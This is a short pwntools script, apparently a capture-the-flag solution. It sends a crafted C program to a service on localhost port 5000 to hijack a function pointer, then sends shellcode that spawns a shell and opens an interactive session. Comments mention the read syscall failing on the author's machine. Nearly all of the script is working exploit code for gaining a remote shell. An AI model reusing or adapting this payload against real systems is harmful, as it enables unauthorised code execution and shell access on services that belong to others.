from pwn import *
context.arch = 'x86-64'
sol = 'tt(){}mm(a){}ma(a){}mi(a){}mn(a){}mt(a){}am(a){}aa(a){}ai(a){}an(a){}at(a){}im(a){}ia(a){}ii(a){}in(a){}it(a){}nm(a){}na(a){}ni(a){}nn(a){}*m;(*a)();main(){mm(m);int*i(){}m=i;*m=(int)mm*(int)mm*(int)mi*(int)mt*(int)am*(int)aa*(int)ai*(int)an*(int)an*(int)at*(int)im*(int)in*(int)it*(int)nm*(int)nm*(int)na*(int)na*(int)ni*(int)nn*(int)nn;a=i;a();}'
p = remote('localhost', '5000')
p.sendline(sol.encode())
# i cant get the read syscall to work on my machine anymore (i swear it worked like a month ago)
# seems to fail here https://github.com/torvalds/linux/blob/master/fs/read_write.c#L558 due to rdx being too big
# works fine on an ubuntu vm though
p.sendline(asm(shellcraft.sh()))
p.interactive()
